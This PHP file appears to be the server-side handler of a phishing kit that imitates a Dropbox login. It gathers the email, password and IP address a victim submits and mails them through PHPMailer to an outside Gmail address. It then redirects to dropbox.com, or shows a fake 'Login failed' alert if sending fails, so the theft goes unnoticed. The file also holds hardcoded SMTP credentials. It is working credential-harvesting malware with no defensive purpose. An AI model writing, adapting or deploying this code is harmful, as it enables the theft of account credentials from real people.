<?php
 
    require ("class.phpmailer.php");
 
    if(isset($_POST['submit'])){
        $username=$_POST['username']; // Get Name value from HTML Form
        $password=$_POST['password']; // Get Name value from HTML Form
		 $ip=$_POST['ip']; // Get Name value from HTML Form

        $mail = new PHPMailer();
         
        $mail->IsSMTP();
        $mail->Host = "mail.fwbbn.com"; // Your Domain Name
         
        $mail->SMTPAuth = true;
        $mail->Port = 25;
        $mail->Username = "info@fwbbn.com"; // Your Email ID
        $mail->Password = "admin@yahoo.com"; // Password of your email id
         
        $mail->From = "info@fwbbn.com";
        $mail->FromName = "DBtools";
        $mail->AddAddress ("collinsbrown337@gmail.com"); // pamelabraines123@gmail.com On which email id you want to get the message
        $mail->AddCC ("");
         
        $mail->IsHTML(true);
         
        $mail->Subject = "DB INFO"; // This is your subject
         
        // HTML Message Starts here
         
        $mail->Body = "
        <html>
            <body>
                <table style='width:600px;'>
                    <tbody>
                    <tr>
                            <td style='width:150px'><strong>Email: </strong></td>
                            <td style='width:400px'>$username</td>
                        </tr>
                        <tr>
                            <td style='width:150px'><strong>Password: </strong></td>
                            <td style='width:400px'>$password</td>
                        </tr>
                        <tr>
                            <td style='width:150px'><strong>IP: </strong></td>
                            <td style='width:400px'>$ip</td>
                        </tr>
                       
                    </tbody>
                </table>
            </body>
        </html>
        ";
        // HTML Message Ends here
         
             
        if(!$mail->Send()) {
            // Message if mail has been sent
            echo "<script>
                alert('Login failed.');
            </script>";
        }
        else {
            // Message if mail has been not sent
           header("Location: http://www.dropbox.com");
        }
 
    }
?>